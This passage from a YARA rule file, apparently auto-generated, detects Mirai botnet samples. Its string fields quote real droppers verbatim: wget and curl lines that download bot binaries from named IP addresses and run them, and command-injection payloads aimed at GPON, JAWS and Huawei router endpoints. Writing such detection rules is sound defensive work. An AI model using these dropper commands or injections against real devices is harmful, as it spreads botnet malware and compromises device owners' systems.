      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s6 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__3f63205b {
   meta:
      description = "_subset_batch - file Mirai(signature)_3f63205b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3f63205b3a6ec29232e6fd6f2594e4e92e3a0fed6eb4ffa0a85238b952cb9a39"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "VUUUGET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s6 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__2acd58ff {
   meta:
      description = "_subset_batch - file Mirai(signature)_2acd58ff.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2acd58ff7a029895e703a2d89d9afc9a9f64790df05c3e50e20f66ff34169c9e"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
      $s2 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__324e61ac {
   meta:
      description = "_subset_batch - file Mirai(signature)_324e61ac.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "324e61ac7c5f6bb6d85b760177fe72f19d8474cbfda15658ee715a0f3605623e"
   strings:
      $s1 = "*hN^NuSNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii /* score: '9.00'*/
      $s2 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
      $s3 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__3b90b475 {
   meta:
      description = "_subset_batch - file Mirai(signature)_3b90b475.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3b90b4750470db769f85d3970a070983094897b6f6ad83907d1f6b8834d428c0"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__406529aa {
   meta:
      description = "_subset_batch - file Mirai(signature)_406529aa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "406529aa46dc1a8e19282cbf39edb73ab4a7365f42cade4577ad52edcb056025"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
      $s2 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__495e597c {
   meta:
      description = "_subset_batch - file Mirai(signature)_495e597c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "495e597cd719c0da080f1968be2b9c59363e21e563bdfc708aeecfb13707949d"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
      $s2 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__59d52359 {
   meta:
      description = "_subset_batch - file Mirai(signature)_59d52359.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "59d5235970d126ae53612bc8e017abba8695ca3dbc83032efa27dae9b775a1c8"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__625d32ef {
   meta:
      description = "_subset_batch - file Mirai(signature)_625d32ef.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "625d32ef058c3159df6f76866f51269e61561afc6d9959e60a3190fe5e0028ca"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
      $s2 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__2ae85ab2 {
   meta:
      description = "_subset_batch - file Mirai(signature)_2ae85ab2.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2ae85ab2fbc2d63a36e60f64dbd2be58b90344061d2e75af45df392a0a488495"
   strings:
      $s1 = "cd /tmp; rm -rf mpsl; wget http://178.16.54.178/mpsl; chmod +x mpsl; ./mpsl cn.mipsel" fullword ascii /* score: '27.00'*/
      $s2 = "cd /tmp; rm -rf arm7; wget http://178.16.54.178/arm7; chmod +x arm7; ./arm7 cn.arm7" fullword ascii /* score: '27.00'*/
      $s3 = "cd /tmp; rm -rf x86; wget http://178.16.54.178/x86; chmod +x x86; ./x86 cn.x86" fullword ascii /* score: '27.00'*/
      $s4 = "cd /tmp; rm -rf arm5; wget http://178.16.54.178/arm5; chmod +x arm5; ./arm5 cn.arm5" fullword ascii /* score: '27.00'*/
      $s5 = "cd /tmp; rm -rf mips; wget http://178.16.54.178/mips; chmod +x mips; ./mips cn.mips" fullword ascii /* score: '27.00'*/
      $s6 = "cd /tmp; rm -rf arm6; wget http://178.16.54.178/arm6; chmod +x arm6; ./arm6 cn.arm6" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Mirai_signature__2b71f4a8 {
   meta:
      description = "_subset_batch - file Mirai(signature)_2b71f4a8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2b71f4a896d8b69d0ea3b7bb55bc84be2825fb68075dd9fef3a4e220fe0f3262"
   strings:
      $s1 = "ropbear" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__32864a5a {
   meta:
      description = "_subset_batch - file Mirai(signature)_32864a5a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "32864a5ad18f1f6f8151a86f587f48e44055fbe94b7c06ace61ada22dc63ad89"
   strings:
      $s1 = "ropbear" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__3838f1f2 {
   meta:
      description = "_subset_batch - file Mirai(signature)_3838f1f2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3838f1f2a1fe279a99f1483d3735554cf588d807f59d3fd1803bd63c7ab50ae7"
   strings:
      $s1 = "(diicot/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(diicot/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "ropbear" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__39b8ae16 {
   meta:
      description = "_subset_batch - file Mirai(signature)_39b8ae16.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "39b8ae164abc55fa51f543f1b8fd58a1307212804ec38eb6a9f8178e5969d4f2"
   strings:
      $s1 = "ropbear" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__2cf25123 {
   meta:
      description = "_subset_batch - file Mirai(signature)_2cf25123.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2cf25123d961745494828d8dbabb1663591560a66cbbf8cfc1d16a149e32cbe9"
   strings:
      $x1 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.arm4; chmod +x Demon.arm4; ./Demon.arm" ascii /* score: '33.00'*/
      $x2 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.mpsl; chmod +x Demon.mpsl; ./Demon.mps" ascii /* score: '33.00'*/
      $x3 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.ppc; chmod +x Demon.ppc; ./Demon.ppc; " ascii /* score: '33.00'*/
      $x4 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.ppc; chmod +x Demon.ppc; ./Demon.ppc; " ascii /* score: '33.00'*/
      $x5 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.mips; chmod +x Demon.mips; ./Demon.mip" ascii /* score: '33.00'*/
      $x6 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.arm7; chmod +x Demon.arm7; ./Demon.arm" ascii /* score: '33.00'*/
      $x7 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.arm5; chmod +x Demon.arm5; ./Demon.arm" ascii /* score: '33.00'*/
      $x8 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.arm6; chmod +x Demon.arm6; ./Demon.arm" ascii /* score: '33.00'*/
      $s9 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.m68k; chmod +x Demon.m68k; ./Demon.m68" ascii /* score: '30.00'*/
      $s10 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.arm5; chmod +x Demon.arm5; ./Demon.arm" ascii /* score: '30.00'*/
      $s11 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.i686; chmod +x Demon.i686; ./Demon.i68" ascii /* score: '30.00'*/
      $s12 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.x86; chmod +x Demon.x86; ./Demon.x86; " ascii /* score: '30.00'*/
      $s13 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.x86; chmod +x Demon.x86; ./Demon.x86; " ascii /* score: '30.00'*/
      $s14 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.mips; chmod +x Demon.mips; ./Demon.mip" ascii /* score: '30.00'*/
      $s15 = "-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.115.208/Demon.mpsl; chmod +x Demon.mpsl; ./Demon.mps" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x652d and filesize < 6KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__2cf6a945 {
   meta:
      description = "_subset_batch - file Mirai(signature)_2cf6a945.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2cf6a9455112fc0f06775f6a8fe64cbad049b693ce77ae9907446aece09b97a1"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox wget http://107.152.41.192/bot.spc ; chmod 777 bot." ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox wget http://107.152.41.192/bot.spc ; chmod 777 bot." ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox wget http://107.152.41.192/bot.ppc ; chmod 777 bot." ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox wget http://107.152.41.192/bot.ppc ; chmod 777 bot." ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mipsel ; /bin/busybox wget http://107.152.41.192/bot.mipsel ; chmod 77" ascii /* score: '27.00'*/
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i586 ; /bin/busybox wget http://107.152.41.192/bot.i586 ; chmod 777 bo" ascii /* score: '27.00'*/
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mips ; /bin/busybox wget http://107.152.41.192/bot.mips ; chmod 777 bo" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv5l ; /bin/busybox wget http://107.152.41.192/bot.armv5l ; chmod 77" ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv6l ; /bin/busybox wget http://107.152.41.192/bot.armv6l ; chmod 77" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv4l ; /bin/busybox wget http://107.152.41.192/bot.armv4l ; chmod 77" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv4l ; /bin/busybox wget http://107.152.41.192/bot.armv4l ; chmod 77" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.m68k ; /bin/busybox wget http://107.152.41.192/bot.m68k ; chmod 777 bo" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv6l ; /bin/busybox wget http://107.152.41.192/bot.armv6l ; chmod 77" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i586 ; /bin/busybox wget http://107.152.41.192/bot.i586 ; chmod 777 bo" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mipsel ; /bin/busybox wget http://107.152.41.192/bot.mipsel ; chmod 77" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__2d37fe8e {
   meta:
      description = "_subset_batch - file Mirai(signature)_2d37fe8e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2d37fe8ee5321b9d79624ef94cfe016fab46f4476455d09ee6ae9da133f5e8a7"
   strings:
      $s1 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__3b9e978e {
   meta:
      description = "_subset_batch - file Mirai(signature)_3b9e978e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3b9e978e132c575ce93fe0a38d89c21f9fffabcd443e3c5adbd561ed86209c34"
   strings:
      $s1 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__326d8294 {
   meta:
      description = "_subset_batch - file Mirai(signature)_326d8294.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "326d82947a616994c3b27264a2cbe6f5b1b9aad103a03d946dba2d9ae90f86f0"
   strings:
      $s1 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__604dccd1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_604dccd1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "604dccd1ebfa5c108673341b10a700402b21e1471fe82f6e199c7da8a339dc76"
   strings:
      $s1 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
      $s2 = "iF#-|]GZiG#s%s%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 80KB and
      all of them
}

rule Mirai_signature__6afcf571 {
   meta:
      description = "_subset_batch - file Mirai(signature)_6afcf571.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6afcf571eec90f00a93b8bf4568f58729404a58aaa8fc61cb8a93f94951b8944"
   strings:
      $s1 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
      $s2 = "getti'}" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 80KB and
      all of them
}

rule Mirai_signature__2df13447 {
   meta:
      description = "_subset_batch - file Mirai(signature)_2df13447.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2df134470ad019b6181d7e09e29fa8d30cecf8dec48c2e1851c14d3c49591236"
   strings:
      $s1 = "wget http://$server_ip//$binname.$arch  $execname" fullword ascii /* score: '23.00'*/
      $s2 = "rm -rf $execname" fullword ascii /* score: '16.00'*/
      $s3 = "./$execname $1" fullword ascii /* score: '12.00'*/
      $s4 = "execname=\"Lilin\"" fullword ascii /* score: '12.00'*/
      $s5 = "chmod 777 $execname" fullword ascii /* score: '12.00'*/
      $s6 = "server_ip=\"109.205.213.5\"" fullword ascii /* score: '9.00'*/
      $s7 = "cd /tmp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6962 and filesize < 1KB and
      all of them
}

rule Mirai_signature__30984024 {
   meta:
      description = "_subset_batch - file Mirai(signature)_30984024.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "30984024db8d77e6cca68f0bfc87a3af2e3afb31b73ea946a97e85db11c8f298"
   strings:
      $s1 = "cd /tmp; rm -rf mips; wget http://178.16.54.178/mips;chmod 777 mips;./mips selfrep.mips" fullword ascii /* score: '27.00'*/
      $s2 = "cd /tmp; rm -rf mpsl; wget http://178.16.54.178/mpsl;chmod 777 mpsl;./mpsl selfrep.mpsl" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Mirai_signature__3322a331 {
   meta:
      description = "_subset_batch - file Mirai(signature)_3322a331.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3322a331765adeddd26136f8dcebbecccff71f7b29ec9f2ce74736b7244faa1c"
   strings:
      $s1 = "(curl http://194.31.222.17/v/mips -o- || busybox curl http://194.31.222.17/v/mips -o-) > .f; chmod 777 .f; ./.f wall" fullword ascii /* score: '23.00'*/
      $s2 = "(curl http://194.31.222.17/v/mipsel -o- || busybox curl http://194.31.222.17/v/mipsel -o-) > .f; chmod 777 .f; ./.f wall" fullword ascii /* score: '23.00'*/
      $s3 = "(curl http://194.31.222.17/v/armv5l -o- || busybox curl http://194.31.222.17/v/armv5l -o-) > .f; chmod 777 .f; ./.f wall" fullword ascii /* score: '23.00'*/
      $s4 = "(curl http://194.31.222.17/v/armv7l -o- || busybox curl http://194.31.222.17/v/armv7l -o-) > .f; chmod 777 .f; ./.f wall" fullword ascii /* score: '23.00'*/
      $s5 = "(curl http://194.31.222.17/v/armv4l -o- || busybox curl http://194.31.222.17/v/armv4l -o-) > .f; chmod 777 .f; ./.f wall" fullword ascii /* score: '23.00'*/
      $s6 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s7 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s8 = ">/var/tmp/.a && cd /var/tmp" fullword ascii /* score: '11.00'*/
      $s9 = ">/home/.a && cd /home" fullword ascii /* score: '11.00'*/
      $s10 = ">/tmp/.a && cd /tmp" fullword ascii /* score: '11.00'*/
      $s11 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
      $s12 = ">/var/.a && cd /var" fullword ascii /* score: '8.00'*/
      $s13 = ">/dev/shm/.a && cd /dev/shm" fullword ascii /* score: '8.00'*/
      $s14 = ">/dev/.a && cd /dev" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2f3e and filesize < 2KB and
      8 of them
}

rule Mirai_signature__64e4bfe0 {
   meta:
      description = "_subset_batch - file Mirai(signature)_64e4bfe0.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "64e4bfe0e791d684afa252071b68a96e7a29582294eaf19074119561f20f741d"
   strings:
      $x1 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.arm -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.arm -O-) > .f; chm" ascii /* score: '31.00'*/
      $s2 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.mips -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.mips -O-) > .f; c" ascii /* score: '28.00'*/
      $s3 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.arm7 -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.arm7 -O-) > .f; c" ascii /* score: '28.00'*/
      $s4 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.arm -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.arm -O-) > .f; chm" ascii /* score: '28.00'*/
      $s5 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.arm5n -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.arm5n -O-) > .f;" ascii /* score: '28.00'*/
      $s6 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.arm6 -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.arm6 -O-) > .f; c" ascii /* score: '28.00'*/
      $s7 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.mpsl -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.mpsl -O-) > .f; c" ascii /* score: '28.00'*/
      $s8 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.mpsl -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.mpsl -O-) > .f; c" ascii /* score: '25.00'*/
      $s9 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.arm7 -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.arm7 -O-) > .f; c" ascii /* score: '25.00'*/
      $s10 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.arm5n -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.arm5n -O-) > .f;" ascii /* score: '25.00'*/
      $s11 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.mips -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.mips -O-) > .f; c" ascii /* score: '25.00'*/
      $s12 = "(wget http://141.98.10.164/upl04d/cl13ent/edu.arm6 -O- || busybox wget http://141.98.10.164/upl04d/cl13ent/edu.arm6 -O-) > .f; c" ascii /* score: '25.00'*/
      $s13 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s14 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s15 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2f3e and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__33a12f7f {
   meta:
      description = "_subset_batch - file Mirai(signature)_33a12f7f.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "33a12f7f16ca08d196b23a638787fc61db21f35180b6c965f20964d242abc97f"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.arc; curl -O http://202.155.9" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.spc; curl -O http://202.155.9" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.ppc; curl -O http://202.155.9" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.arm; curl -O http://202.155.9" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.arc; curl -O http://202.155.9" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.arm; curl -O http://202.155.9" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.ppc; curl -O http://202.155.9" ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.spc; curl -O http://202.155.9" ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.i686; curl -O http://202.155." ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.mpsl; curl -O http://202.155." ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.m68k; curl -O http://202.155." ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.arm5; curl -O http://202.155." ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.mips; curl -O http://202.155." ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.arm7; curl -O http://202.155." ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://202.155.95.62/hiddenbin/boatnet.sh4; curl -O http://202.155.9" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x630a and filesize < 8KB and
      8 of them
}

rule Mirai_signature__346b2071 {
   meta:
      description = "_subset_batch - file Mirai(signature)_346b2071.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "346b20716120d32f8eb0fccb8e0149996a948654898ecef77743317024dc7715"
   strings:
      $s1 = "cd /tmp; rm -rf mpsl; wget http://178.16.54.178/mpsl;chmod 777 mpsl;./mpsl fhttpd.mpsl" fullword ascii /* score: '27.00'*/
      $s2 = "cd /tmp; rm -rf mips; wget http://178.16.54.178/mips;chmod 777 mips;./mips fhttpd.mips" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Mirai_signature__35ede932 {
   meta:
      description = "_subset_batch - file Mirai(signature)_35ede932.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "35ede932009853ef47e2465cbfb6b782b68069b63f59d760a7b0ffbe03a56ea0"
   strings:
      $s1 = "[%s():%d] Killed flood process [pid=%d]" fullword ascii /* score: '23.00'*/
      $s2 = "[%s():%d] Skipping own process!" fullword ascii /* score: '21.00'*/
